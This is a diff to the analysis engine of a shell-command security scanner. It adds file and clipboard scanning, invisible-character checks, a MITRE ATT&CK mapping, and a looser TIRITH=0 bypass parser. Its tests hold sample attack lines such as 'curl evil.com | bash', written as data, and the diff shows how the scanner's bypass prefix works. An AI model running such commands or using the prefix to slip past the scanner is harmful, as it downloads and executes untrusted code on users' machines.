@@ -28,12 +28,21 @@ pub struct AnalysisContext {
     pub raw_bytes: Option<Vec<u8>>,
     pub interactive: bool,
     pub cwd: Option<String>,
+    /// File path being scanned (only populated for ScanContext::FileScan).
+    pub file_path: Option<std::path::PathBuf>,
+    /// Only populated for ScanContext::FileScan. When None, configfile checks use
+    /// `file_path`'s parent as implicit repo root.
+    pub repo_root: Option<String>,
+    /// True when `file_path` was explicitly provided by the user as a config file.
+    pub is_config_override: bool,
+    /// Clipboard HTML content for rich-text paste analysis.
+    /// Only populated when `tirith paste --html <path>` is used.
+    pub clipboard_html: Option<String>,
 }
 
 /// Check if the input contains an inline `TIRITH=0` bypass prefix.
 /// Handles POSIX bare prefix (`TIRITH=0 cmd`), env wrappers (`env -i TIRITH=0 cmd`),
 /// and PowerShell env syntax (`$env:TIRITH="0"; cmd`).
-/// Requires a real command word after the bypass — `TIRITH=0;` alone is not honored.
 fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     use crate::tokenize;
 
@@ -47,29 +56,18 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
 
     // Case 1: Leading VAR=VALUE assignments before the command
     let mut idx = 0;
-    let mut found_tirith = false;
     while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-        if is_tirith_bypass_assignment(&words[idx]) {
-            found_tirith = true;
+        if words[idx] == "TIRITH=0" {
+            return true;
         }
         idx += 1;
     }
-    // Only honor bypass if a real command follows in the same segment
-    if found_tirith && idx < words.len() {
-        return true;
-    }
 
     // Case 2: First real word is `env` — parse env-style args
-    // Reset: skip any leading non-TIRITH assignments to reach the `env` command
-    idx = 0;
-    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-        idx += 1;
-    }
     if idx < words.len() {
         let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
         if cmd == "env" {
             idx += 1;
-            found_tirith = false;
             while idx < words.len() {
                 let w = &words[idx];
                 if w == "--" {
@@ -78,16 +76,25 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
                     break;
                 }
                 if tokenize::is_env_assignment(w) {
-                    if is_tirith_bypass_assignment(w) {
-                        found_tirith = true;
+                    if w == "TIRITH=0" {
+                        return true;
                     }
                     idx += 1;
                     continue;
                 }
                 if w.starts_with('-') {
-                    // -u takes a value arg
-                    if w == "-u" {
-                        idx += 2; // skip -u and its value
+                    if w.starts_with("--") {
+                        // Long flags: --unset=VAR (skip) or --unset VAR (skip next)
+                        if !w.contains('=') {
+                            idx += 2;
+                        } else {
+                            idx += 1;
+                        }
+                        continue;
+                    }
+                    // Short flags that take a separate value arg
+                    if w == "-u" || w == "-C" || w == "-S" {
+                        idx += 2;
                         continue;
                     }
                     idx += 1;
@@ -98,14 +105,10 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
             }
             // Check remaining words after -- for TIRITH=0
             while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-                if is_tirith_bypass_assignment(&words[idx]) {
-                    found_tirith = true;
+                if words[idx] == "TIRITH=0" {
+                    return true;
                 }
                 idx += 1;
-            }
-            // Only honor bypass if env has a command to run
-            if found_tirith && idx < words.len() {
-                return true;
             }
         }
     }
@@ -133,21 +136,6 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     false
 }
 
-/// Check if a word is a `TIRITH=0` assignment, handling optional quotes around the value.
-/// `split_raw_words` preserves quote chars, so we may see `TIRITH='0'` or `TIRITH="0"`.
-fn is_tirith_bypass_assignment(word: &str) -> bool {
-    if let Some(eq_pos) = word.find('=') {
-        let name = &word[..eq_pos];
-        if name != "TIRITH" {
-            return false;
-        }
-        let value = &word[eq_pos + 1..];
-        strip_surrounding_quotes(value) == "0"
-    } else {
-        false
-    }
-}
-
 /// Check if a word is `$env:TIRITH=0` with optional quotes around the value.
 /// The `$env:` prefix is matched case-insensitively (PowerShell convention).
 fn is_powershell_tirith_bypass(word: &str) -> bool {
@@ -155,15 +143,20 @@ fn is_powershell_tirith_bypass(word: &str) -> bool {
         return false;
     }
     let after_dollar = &word[1..];
-    let prefix = "env:";
-    let after_env = match after_dollar.get(..prefix.len()) {
-        Some(s) if s.eq_ignore_ascii_case(prefix) => &after_dollar[prefix.len()..],
-        _ => return false,
-    };
-    let value = match after_env.strip_prefix("TIRITH=") {
-        Some(v) => v,
-        None => return false,
-    };
+    if !after_dollar
+        .get(..4)
+        .is_some_and(|s| s.eq_ignore_ascii_case("env:"))
+    {
+        return false;
+    }
+    let after_env = &after_dollar[4..];
+    if !after_env
+        .get(..7)
+        .is_some_and(|s| s.eq_ignore_ascii_case("TIRITH="))
+    {
+        return false;
+    }
+    let value = &after_env[7..];
     strip_surrounding_quotes(value) == "0"
 }
 
@@ -173,11 +166,13 @@ fn is_powershell_env_ref(word: &str, var_name: &str) -> bool {
         return false;
     }
     let after_dollar = &word[1..];
-    let prefix = "env:";
-    after_dollar
-        .get(..prefix.len())
-        .is_some_and(|s| s.eq_ignore_ascii_case(prefix))
-        && (after_dollar.get(prefix.len()..) == Some(var_name))
+    if !after_dollar
+        .get(..4)
+        .is_some_and(|s| s.eq_ignore_ascii_case("env:"))
+    {
+        return false;
+    }
+    after_dollar[4..].eq_ignore_ascii_case(var_name)
 }
 
 /// Strip a single layer of matching quotes (single or double) from a string.
@@ -216,7 +211,7 @@ fn split_raw_words(input: &str) -> Vec<String> {
             ' ' | '\t' => {
                 i += 1;
             }
-            '|' | ';' | '&' | '\n' => break, // Stop at segment boundary
+            '|' | ';' | '\n' | '&' => break, // Stop at segment boundary
             '\'' => {
                 current.push(ch);
                 i += 1;
@@ -321,8 +316,18 @@ fn resolve_env_wrapper(args: &[String]) -> Option<String> {
             continue;
         }
         if w.starts_with('-') {
-            if w == "-u" {
-                i += 2; // skip -u and its value
+            if w.starts_with("--") {
+                // Long flags: --unset=VAR (skip) or --unset VAR (skip next)
+                if !w.contains('=') {
+                    i += 2;
+                } else {
+                    i += 1;
+                }
+                continue;
+            }
+            // Short flags that take a separate value arg
+            if w == "-u" || w == "-C" || w == "-S" {
+                i += 2;
                 continue;
             }
             i += 1;
@@ -343,20 +348,12 @@ fn resolve_env_wrapper(args: &[String]) -> Option<String> {
     None
 }
 
-/// Resolve through `command` wrapper: skip flags, then `--`, take next arg.
-/// Returns None for `command -v` / `command -V` which only look up commands, not execute them.
+/// Resolve through `command` wrapper: skip flags like -v, -p, -V, then `--`, take next arg.
 fn resolve_command_wrapper(args: &[String]) -> Option<String> {
     let mut i = 0;
-    let mut is_lookup = false;
-    // Parse flags; -v and -V are lookup-only (print path/version, no execution)
+    // Skip flags like -v, -p, -V
     while i < args.len() && args[i].starts_with('-') && args[i] != "--" {
-        if args[i] == "-v" || args[i] == "-V" {
-            is_lookup = true;
-        }
         i += 1;
-    }
-    if is_lookup {
-        return None;
     }
     // Skip -- if present
     if i < args.len() && args[i] == "--" {
@@ -410,6 +407,10 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
                 || scan.has_bidi_controls
                 || scan.has_zero_width
                 || scan.has_invalid_utf8
+                || scan.has_unicode_tags
+                || scan.has_variation_selectors
+                || scan.has_invisible_math_operators
+                || scan.has_invisible_whitespace
         } else {
             false
         }
@@ -420,10 +421,15 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
     // Step 2: URL-like regex scan
     let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);
 
-    // Step 3 (exec only): check for bidi/zero-width chars even without URLs
+    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs
     let exec_bidi_triggered = if ctx.scan_context == ScanContext::Exec {
         let scan = extract::scan_bytes(ctx.input.as_bytes());
-        scan.has_bidi_controls || scan.has_zero_width
+        scan.has_bidi_controls
+            || scan.has_zero_width
+            || scan.has_unicode_tags
+            || scan.has_variation_selectors
+            || scan.has_invisible_math_operators
+            || scan.has_invisible_whitespace
     } else {
         false
     };
@@ -489,8 +495,14 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
             verdict.bypass_honored = true;
             verdict.interactive_detected = ctx.interactive;
             verdict.policy_path_used = policy.path.clone();
-            // Log bypass to audit
-            crate::audit::log_verdict(&verdict, &ctx.input, None, None);
+            // Log bypass to audit (include custom DLP patterns from partial policy)
+            crate::audit::log_verdict(
+                &verdict,
+                &ctx.input,
+                None,
+                None,
+                &policy.dlp_custom_patterns,
+            );
             return verdict;
         }
     }
@@ -504,69 +516,155 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
     let tier3_start = Instant::now();
     let mut findings = Vec::new();
 
-    // Run byte-level rules for paste context
-    if ctx.scan_context == ScanContext::Paste {
-        if let Some(ref bytes) = ctx.raw_bytes {
-            let byte_findings = crate::rules::terminal::check_bytes(bytes);
-            findings.extend(byte_findings);
+    // Track extracted URLs for allowlist/blocklist (Exec/Paste only)
+    let mut extracted = Vec::new();
+
+    if ctx.scan_context == ScanContext::FileScan {
+        // FileScan: byte scan + configfile rules ONLY.
+        // Does NOT run command/env/URL-extraction rules.
+        let byte_input = if let Some(ref bytes) = ctx.raw_bytes {
+            bytes.as_slice()
+        } else {
+            ctx.input.as_bytes()
+        };
+        let byte_findings = crate::rules::terminal::check_bytes(byte_input);
+        findings.extend(byte_findings);
+
+        // Config file detection rules
+        findings.extend(crate::rules::configfile::check(
+            &ctx.input,
+            ctx.file_path.as_deref(),
+            ctx.repo_root.as_deref().map(std::path::Path::new),
+            ctx.is_config_override,
+        ));
+
+        // Rendered content rules (file-type gated)
+        if crate::rules::rendered::is_renderable_file(ctx.file_path.as_deref()) {
+            // PDF files get their own parser
+            let is_pdf = ctx
+                .file_path
+                .as_deref()
+                .and_then(|p| p.extension())
+                .and_then(|e| e.to_str())
+                .map(|e| e.eq_ignore_ascii_case("pdf"))
+                .unwrap_or(false);
+
+            if is_pdf {
+                let pdf_bytes = ctx.raw_bytes.as_deref().unwrap_or(ctx.input.as_bytes());
+                findings.extend(crate::rules::rendered::check_pdf(pdf_bytes));
+            } else {
+                findings.extend(crate::rules::rendered::check(
+                    &ctx.input,
+                    ctx.file_path.as_deref(),
+                ));
+            }
         }
-        // Check for hidden multiline content in pasted text
-        let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
-        findings.extend(multiline_findings);
-    }
+    } else {
+        // Exec/Paste: standard pipeline
 
-    // Bidi and zero-width checks apply to both exec and paste contexts
-    // (exec context: bidi in URLs/commands is always dangerous)
-    if ctx.scan_context == ScanContext::Exec {
-        let byte_input = ctx.input.as_bytes();
-        let scan = extract::scan_bytes(byte_input);
-        if scan.has_bidi_controls || scan.has_zero_width {
-            let byte_findings = crate::rules::terminal::check_bytes(byte_input);
-            // Only keep bidi and zero-width findings for exec context
-            findings.extend(byte_findings.into_iter().filter(|f| {
-                matches!(
-                    f.rule_id,
-                    crate::verdict::RuleId::BidiControls | crate::verdict::RuleId::ZeroWidthChars
-                )
-            }));
+        // Run byte-level rules for paste context
+        if ctx.scan_context == ScanContext::Paste {
+            if let Some(ref bytes) = ctx.raw_bytes {
+                let byte_findings = crate::rules::terminal::check_bytes(bytes);
+                findings.extend(byte_findings);
+            }
+            // Check for hidden multiline content in pasted text
+            let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
+            findings.extend(multiline_findings);
+
+            // Check clipboard HTML for hidden content (rich-text paste analysis)
+            if let Some(ref html) = ctx.clipboard_html {
+                let clipboard_findings =
+                    crate::rules::terminal::check_clipboard_html(html, &ctx.input);
+                findings.extend(clipboard_findings);
+            }
+        }
+
+        // Invisible character checks apply to both exec and paste contexts
+        if ctx.scan_context == ScanContext::Exec {
+            let byte_input = ctx.input.as_bytes();
+            let scan = extract::scan_bytes(byte_input);
+            if scan.has_bidi_controls
+                || scan.has_zero_width
+                || scan.has_unicode_tags
+                || scan.has_variation_selectors
+                || scan.has_invisible_math_operators
+                || scan.has_invisible_whitespace
+            {
+                let byte_findings = crate::rules::terminal::check_bytes(byte_input);
+                // Only keep invisible-char findings for exec context
+                findings.extend(byte_findings.into_iter().filter(|f| {
+                    matches!(
+                        f.rule_id,
+                        crate::verdict::RuleId::BidiControls
+                            | crate::verdict::RuleId::ZeroWidthChars
+                            | crate::verdict::RuleId::UnicodeTags
+                            | crate::verdict::RuleId::InvisibleMathOperator
+                            | crate::verdict::RuleId::VariationSelector
+                            | crate::verdict::RuleId::InvisibleWhitespace
+                    )
+                }));
+            }
+        }
+
+        // Extract and analyze URLs
+        extracted = extract::extract_urls(&ctx.input, ctx.shell);
+
+        for url_info in &extracted {
+            // Normalize path if available — use raw extracted URL's path for non-ASCII detection
+            // since url::Url percent-encodes non-ASCII during parsing
+            let raw_path = extract_raw_path_from_url(&url_info.raw);
+            let normalized_path = url_info.parsed.path().map(normalize::normalize_path);
+
+            // Run all rule categories
+            let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
+            findings.extend(hostname_findings);
+
+            let path_findings = crate::rules::path::check(
+                &url_info.parsed,
+                normalized_path.as_ref(),
+                raw_path.as_deref(),
+            );
+            findings.extend(path_findings);
+
+            let transport_findings =
+                crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
+            findings.extend(transport_findings);
+
+            let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
+            findings.extend(ecosystem_findings);
+        }
+
+        // Run command-shape rules on full input
+        let command_findings = crate::rules::command::check(&ctx.input, ctx.shell);
+        findings.extend(command_findings);
+
+        // Run environment rules
+        let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
+        findings.extend(env_findings);
+
+        // Policy-driven network deny/allow (Team feature)
+        if crate::license::current_tier() >= crate::license::Tier::Team
+            && !policy.network_deny.is_empty()
+        {
+            let net_findings = crate::rules::command::check_network_policy(
+                &ctx.input,
+                ctx.shell,
+                &policy.network_deny,
+                &policy.network_allow,
+            );
+            findings.extend(net_findings);
         }
     }
 
-    // Extract and analyze URLs
-    let extracted = extract::extract_urls(&ctx.input, ctx.shell);
-
-    for url_info in &extracted {
-        // Normalize path if available — use raw extracted URL's path for non-ASCII detection
-        // since url::Url percent-encodes non-ASCII during parsing
-        let raw_path = extract_raw_path_from_url(&url_info.raw);
-        let normalized_path = url_info.parsed.path().map(normalize::normalize_path);
-
-        // Run all rule categories
-        let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
-        findings.extend(hostname_findings);
-
-        let path_findings = crate::rules::path::check(
-            &url_info.parsed,
-            normalized_path.as_ref(),
-            raw_path.as_deref(),
-        );
-        findings.extend(path_findings);
-
-        let transport_findings =
-            crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
-        findings.extend(transport_findings);
-
-        let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
-        findings.extend(ecosystem_findings);
+    // Custom YAML detection rules (Team-only, Phase 24)
+    if crate::license::current_tier() >= crate::license::Tier::Team
+        && !policy.custom_rules.is_empty()
+    {
+        let compiled = crate::rules::custom::compile_rules(&policy.custom_rules);
+        let custom_findings = crate::rules::custom::check(&ctx.input, ctx.scan_context, &compiled);
+        findings.extend(custom_findings);
     }
-
-    // Run command-shape rules on full input
-    let command_findings = crate::rules::command::check(&ctx.input, ctx.shell);
-    findings.extend(command_findings);
-
-    // Run environment rules
-    let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
-    findings.extend(env_findings);
 
     // Apply policy severity overrides
     for finding in &mut findings {
@@ -587,6 +685,10 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
                 evidence: vec![crate::verdict::Evidence::Url {
                     raw: url_info.raw.clone(),
                 }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
             });
         }
     }
@@ -619,6 +721,20 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
         });
     }
 
+    // Enrichment pass (ADR-13): detection is free, enrichment is paid.
+    // All detection rules have already run above. Now add tier-gated enrichment.
+    let tier = crate::license::current_tier();
+    if tier >= crate::license::Tier::Pro {
+        enrich_pro(&mut findings);
+    }
+    if tier >= crate::license::Tier::Team {
+        enrich_team(&mut findings);
+    }
+
+    // Early access filter (ADR-14): suppress non-critical findings for rules
+    // in time-boxed early access windows when tier is below the minimum.
+    crate::rule_metadata::filter_early_access(&mut findings, tier);
+
     let tier3_ms = tier3_start.elapsed().as_secs_f64() * 1000.0;
     let total_ms = start.elapsed().as_secs_f64() * 1000.0;
 
@@ -641,6 +757,216 @@ pub fn analyze(ctx: &AnalysisContext) -> Verdict {
     verdict
 }
 
+// ---------------------------------------------------------------------------
+// Paranoia tier filtering (Phase 15)
+// ---------------------------------------------------------------------------
+
+/// Filter a verdict's findings by paranoia level and license tier.
+///
+/// This is an output-layer filter — the engine always detects everything (ADR-13).
+/// CLI/MCP call this after `analyze()` to reduce noise at lower paranoia levels.
+///
+/// - Paranoia 1-2 (any tier): Medium+ findings only
+/// - Paranoia 3 (Pro required): also show Low findings
+/// - Paranoia 4 (Pro required): also show Info findings
+///
+/// Free-tier users are capped at effective paranoia 2 regardless of policy setting.
+pub fn filter_findings_by_paranoia(verdict: &mut Verdict, paranoia: u8) {
+    retain_by_paranoia(&mut verdict.findings, paranoia);
+    verdict.action = recalculate_action(&verdict.findings);
+}
+
+/// Filter a Vec<Finding> by paranoia level and license tier.
+/// Same logic as `filter_findings_by_paranoia` but operates on raw findings
+/// (for scan results that don't use the Verdict wrapper).
+pub fn filter_findings_by_paranoia_vec(findings: &mut Vec<Finding>, paranoia: u8) {
+    retain_by_paranoia(findings, paranoia);
+}
+
+/// Recalculate verdict action from the current findings (same logic as `Verdict::from_findings`).
+fn recalculate_action(findings: &[Finding]) -> crate::verdict::Action {
+    use crate::verdict::{Action, Severity};
+    if findings.is_empty() {
+        return Action::Allow;
+    }
+    let max_severity = findings
+        .iter()
+        .map(|f| f.severity)
+        .max()
+        .unwrap_or(Severity::Low);
+    match max_severity {
+        Severity::Critical | Severity::High => Action::Block,
+        Severity::Medium | Severity::Low => Action::Warn,
+        Severity::Info => Action::Allow,
+    }
+}
+
+/// Shared paranoia retention logic.
+fn retain_by_paranoia(findings: &mut Vec<Finding>, paranoia: u8) {
+    let tier = crate::license::current_tier();
+    let effective = if tier >= crate::license::Tier::Pro {
+        paranoia.min(4)
+    } else {
+        paranoia.min(2) // Free users capped at 2
+    };
+
+    findings.retain(|f| match f.severity {
+        crate::verdict::Severity::Info => effective >= 4,
+        crate::verdict::Severity::Low => effective >= 3,
+        _ => true, // Medium/High/Critical always shown
+    });
+}
+
+// ---------------------------------------------------------------------------
+// Tier-gated enrichment (ADR-13: detect free, enrich paid)
+// ---------------------------------------------------------------------------
+
+/// Pro enrichment: dual-view, decoded content, cloaking diffs, line numbers.
+fn enrich_pro(findings: &mut [Finding]) {
+    for finding in findings.iter_mut() {
+        match finding.rule_id {
+            // Rendered content findings: show what human sees vs what agent processes
+            crate::verdict::RuleId::HiddenCssContent => {
+                finding.human_view =
+                    Some("Content hidden via CSS — invisible in rendered view".into());
+                finding.agent_view = Some(format!(
+                    "AI agent sees full text including CSS-hidden content. {}",
+                    evidence_summary(&finding.evidence)
+                ));
+            }
+            crate::verdict::RuleId::HiddenColorContent => {
+                finding.human_view =
+                    Some("Text blends with background — invisible to human eye".into());
+                finding.agent_view = Some(format!(
+                    "AI agent reads text regardless of color contrast. {}",
+                    evidence_summary(&finding.evidence)
+                ));
+            }
+            crate::verdict::RuleId::HiddenHtmlAttribute => {
+                finding.human_view =
+                    Some("Elements marked hidden/aria-hidden — not displayed".into());
+                finding.agent_view = Some(format!(
+                    "AI agent processes hidden element content. {}",
+                    evidence_summary(&finding.evidence)
+                ));
+            }
+            crate::verdict::RuleId::HtmlComment => {
+                finding.human_view = Some("HTML comments not rendered in browser".into());
+                finding.agent_view = Some(format!(
+                    "AI agent reads comment content as context. {}",
+                    evidence_summary(&finding.evidence)
+                ));
+            }
+            crate::verdict::RuleId::MarkdownComment => {
+                finding.human_view = Some("Markdown comments not rendered in preview".into());
+                finding.agent_view = Some(format!(
+                    "AI agent processes markdown comment content. {}",
+                    evidence_summary(&finding.evidence)
+                ));
+            }
+            crate::verdict::RuleId::PdfHiddenText => {
+                finding.human_view = Some("Sub-pixel text invisible in PDF viewer".into());
+                finding.agent_view = Some(format!(
+                    "AI agent extracts all text including sub-pixel content. {}",
+                    evidence_summary(&finding.evidence)
+                ));
+            }
+            crate::verdict::RuleId::ClipboardHidden => {
+                finding.human_view =
+                    Some("Hidden content in clipboard HTML not visible in paste preview".into());
+                finding.agent_view = Some(format!(
+                    "AI agent processes full clipboard including hidden HTML. {}",
+                    evidence_summary(&finding.evidence)
+                ));
+            }
+            _ => {}
+        }
+    }
+}
+
+/// Summarize evidence entries for enrichment text.
+fn evidence_summary(evidence: &[crate::verdict::Evidence]) -> String {
+    let details: Vec<&str> = evidence
+        .iter()
+        .filter_map(|e| {
+            if let crate::verdict::Evidence::Text { detail } = e {
+                Some(detail.as_str())
+            } else {
+                None
+            }
+        })
+        .take(3)
+        .collect();
+    if details.is_empty() {
+        String::new()
+    } else {
+        format!("Details: {}", details.join("; "))
+    }
+}
+
+/// MITRE ATT&CK technique mapping for built-in rules.
+fn mitre_id_for_rule(rule_id: crate::verdict::RuleId) -> Option<&'static str> {
+    use crate::verdict::RuleId;
+    match rule_id {
+        // Execution
+        RuleId::PipeToInterpreter
+        | RuleId::CurlPipeShell
+        | RuleId::WgetPipeShell
+        | RuleId::HttpiePipeShell
+        | RuleId::XhPipeShell => Some("T1059.004"), // Command and Scripting Interpreter: Unix Shell
+
+        // Persistence
+        RuleId::DotfileOverwrite => Some("T1546.004"), // Event Triggered Execution: Unix Shell Config
+
+        // Defense Evasion
+        RuleId::BidiControls
+        | RuleId::UnicodeTags
+        | RuleId::ZeroWidthChars
+        | RuleId::InvisibleMathOperator
+        | RuleId::VariationSelector
+        | RuleId::InvisibleWhitespace => {
+            Some("T1036.005") // Masquerading: Match Legitimate Name or Location
+        }
+        RuleId::HiddenMultiline | RuleId::AnsiEscapes | RuleId::ControlChars => Some("T1036.005"),
+
+        // Hijack Execution Flow
+        RuleId::CodeInjectionEnv => Some("T1574.006"), // Hijack Execution Flow: Dynamic Linker Hijacking
+        RuleId::InterpreterHijackEnv => Some("T1574.007"), // Path Interception by PATH
+        RuleId::ShellInjectionEnv => Some("T1546.004"), // Shell Config Modification
+
+        // Credential Access
+        RuleId::MetadataEndpoint => Some("T1552.005"), // Unsecured Credentials: Cloud Instance Metadata
+        RuleId::SensitiveEnvExport => Some("T1552.001"), // Credentials In Files
+
+        // Supply Chain
+        RuleId::ConfigInjection => Some("T1195.001"), // Supply Chain Compromise: Dev Tools
+        RuleId::McpInsecureServer | RuleId::McpSuspiciousArgs => Some("T1195.002"), // Compromise Software Supply Chain
+        RuleId::GitTyposquat => Some("T1195.001"),
+        RuleId::DockerUntrustedRegistry => Some("T1195.002"),
+
+        // Discovery / Lateral Movement
+        RuleId::PrivateNetworkAccess => Some("T1046"), // Network Service Discovery
+        RuleId::ServerCloaking => Some("T1036"),       // Masquerading
+
+        // Collection
+        RuleId::ArchiveExtract => Some("T1560.001"), // Archive Collected Data: Archive via Utility
+
+        // Exfiltration
+        RuleId::ProxyEnvSet => Some("T1090.001"), // Proxy: Internal Proxy
+
+        _ => None,
+    }
+}
+
+/// Team enrichment: MITRE ATT&CK classification.
+fn enrich_team(findings: &mut [Finding]) {
+    for finding in findings.iter_mut() {
+        if finding.mitre_id.is_none() {
+            finding.mitre_id = mitre_id_for_rule(finding.rule_id).map(String::from);
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -655,6 +981,10 @@ mod tests {
             raw_bytes: None,
             interactive: true,
             cwd: None,
+            file_path: None,
+            repo_root: None,
+            is_config_override: false,
+            clipboard_html: None,
         };
         let verdict = analyze(&ctx);
         // Should reach tier 3 (not fast-exit at tier 1)
@@ -674,6 +1004,74 @@ mod tests {
     }
 
     #[test]
+    fn test_paranoia_filter_suppresses_info_low() {
+        use crate::verdict::{Finding, RuleId, Severity, Timings, Verdict};
+
+        let findings = vec![
+            Finding {
+                rule_id: RuleId::VariationSelector,
+                severity: Severity::Info,
+                title: "info finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+            Finding {
+                rule_id: RuleId::InvisibleWhitespace,
+                severity: Severity::Low,
+                title: "low finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+            Finding {
+                rule_id: RuleId::HiddenCssContent,
+                severity: Severity::High,
+                title: "high finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+        ];
+
+        let timings = Timings {
+            tier0_ms: 0.0,
+            tier1_ms: 0.0,
+            tier2_ms: None,
+            tier3_ms: None,
+            total_ms: 0.0,
+        };
+
+        // Default paranoia (1): only Medium+ shown
+        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
+        filter_findings_by_paranoia(&mut verdict, 1);
+        assert_eq!(
+            verdict.findings.len(),
+            1,
+            "paranoia 1 should keep only High+"
+        );
+        assert_eq!(verdict.findings[0].severity, Severity::High);
+
+        // Paranoia 2: still only Medium+ (free tier cap)
+        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
+        filter_findings_by_paranoia(&mut verdict, 2);
+        assert_eq!(
+            verdict.findings.len(),
+            1,
+            "paranoia 2 should keep only Medium+"
+        );
+    }
+
+    #[test]
     fn test_inline_bypass_bare_prefix() {
         assert!(find_inline_bypass(
             "TIRITH=0 curl evil.com | bash",
@@ -682,54 +1080,11 @@ mod tests {
     }
 
     #[test]
-    fn test_inline_bypass_quoted_single() {
-        // TIRITH='0' should be recognized (split_raw_words preserves quotes)
-        assert!(find_inline_bypass(
-            "TIRITH='0' curl evil.com",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_inline_bypass_quoted_double() {
-        assert!(find_inline_bypass(
-            "TIRITH=\"0\" curl evil.com",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_inline_bypass_no_command() {
-        // TIRITH=0 alone (no command) should NOT be treated as bypass
-        assert!(!find_inline_bypass("TIRITH=0", ShellType::Posix));
-    }
-
-    #[test]
-    fn test_inline_bypass_semicolon_no_command() {
-        // TIRITH=0; (semicolon but no command in segment) should NOT bypass
-        assert!(!find_inline_bypass("TIRITH=0;", ShellType::Posix));
-    }
-
-    #[test]
     fn test_inline_bypass_env_wrapper() {
         assert!(find_inline_bypass(
             "env TIRITH=0 curl evil.com",
             ShellType::Posix
         ));
-    }
-
-    #[test]
-    fn test_inline_bypass_env_quoted() {
-        assert!(find_inline_bypass(
-            "env TIRITH='0' curl evil.com",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_inline_bypass_env_no_command() {
-        // env TIRITH=0 (no command for env to run) should NOT bypass
-        assert!(!find_inline_bypass("env TIRITH=0", ShellType::Posix));
     }
 
     #[test]
@@ -768,15 +1123,6 @@ mod tests {
     fn test_no_inline_bypass() {
         assert!(!find_inline_bypass(
             "curl evil.com | bash",
-            ShellType::Posix
-        ));
-    }
-
-    #[test]
-    fn test_inline_bypass_wrong_value_quoted() {
-        // TIRITH='1' should NOT be a bypass
-        assert!(!find_inline_bypass(
-            "TIRITH='1' curl evil.com",
             ShellType::Posix
         ));
     }
@@ -871,17 +1217,6 @@ mod tests {
     }
 
     #[test]
-    fn test_not_self_invocation_command_v() {
-        // `command -v tirith` is a lookup, not execution
-        assert!(!is_self_invocation("command -v tirith", ShellType::Posix));
-    }
-
-    #[test]
-    fn test_not_self_invocation_command_upper_v() {
-        assert!(!is_self_invocation("command -V tirith", ShellType::Posix));
-    }
-
-    #[test]
     fn test_self_invocation_time_p() {
         assert!(is_self_invocation(
             "time -p tirith diff url",
@@ -902,6 +1237,115 @@ mod tests {
         assert!(!is_self_invocation(
             "curl https://evil.com",
             ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_c_flag() {
+        // env -C takes a directory arg; TIRITH=0 should still be found after it
+        assert!(find_inline_bypass(
+            "env -C /tmp TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_s_flag() {
+        // env -S takes a string arg; TIRITH=0 should still be found after it
+        assert!(find_inline_bypass(
+            "env -S 'some args' TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_self_invocation_env_c_flag() {
+        // env -C /tmp tirith should resolve through -C's value arg
+        assert!(is_self_invocation(
+            "env -C /tmp tirith diff url",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_not_self_invocation_env_c_misidentify() {
+        // env -C /tmp curl — should NOT be identified as self-invocation
+        assert!(!is_self_invocation(
+            "env -C /tmp curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_paranoia_filter_recalculates_action() {
+        use crate::verdict::{Action, Finding, RuleId, Severity, Timings, Verdict};
+
+        let findings = vec![
+            Finding {
+                rule_id: RuleId::InvisibleWhitespace,
+                severity: Severity::Low,
+                title: "low finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+            Finding {
+                rule_id: RuleId::HiddenCssContent,
+                severity: Severity::Medium,
+                title: "medium finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+        ];
+
+        let timings = Timings {
+            tier0_ms: 0.0,
